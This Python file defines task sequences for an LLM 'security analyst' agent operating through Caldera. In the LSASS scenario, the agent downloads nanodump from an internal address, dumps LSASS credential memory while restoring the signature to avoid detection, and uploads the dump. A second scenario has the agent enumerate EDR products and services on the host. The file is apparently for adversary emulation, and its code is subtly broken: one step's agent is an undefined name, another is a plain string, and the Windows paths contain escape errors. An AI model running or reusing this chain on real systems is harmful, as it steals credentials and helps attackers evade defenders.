from agents.analyst_agents import security_analyst_agent


actions = {
    "COLLECT_CALDERA_INFO": [
        {
            "message": "Get the ID of the active Caldera operation.",
            "agent": security_analyst_agent,
        },
        {
            "message": "Get the PAW of the active Caldera agent by calling /api/v2/agents.",
            "agent": security_analyst_agent,
        },
        {
            "message": "Summarize the ID and PAW in a table based on the context.",
            "agent": security_analyst_agent,
        },
    ],
    "DETECT_EDR": [
        {
            "message": "Download https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/README.md",
            "agent": security_analyst_agent,
        },
        {
            "message": "Extract a list of all security products based on the textual context provided, don't use tools",
            "agent": text,
        },
        {
            "message": "List all Windows services on the active Caldera agent",
            "agent": "security_analyst_agent",
        },
    ],
    "DOWNLOAD_AND_RUN_NANODUMP": [
        {
            "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\temp of the active agent.",
            "agent": security_analyst_agent,
        },
        {
            "message": "Analyze the available nanodump flags at https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
            "agent": security_analyst_agent,
        },
        {
            "message": "Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\temp.",
            "agent": security_analyst_agent,
        },
        {
            "message": "Use PowerShell to upload the dumped LSASS file.",
            "agent": security_analyst_agent,
        },
    ],
}

scenarios = {
    "LSASS": [
        "COLLECT_CALDERA_INFO",
        "DOWNLOAD_AND_RUN_NANODUMP",
    ],
    "DETECT_EDR": ["DETECT_EDR"],
}
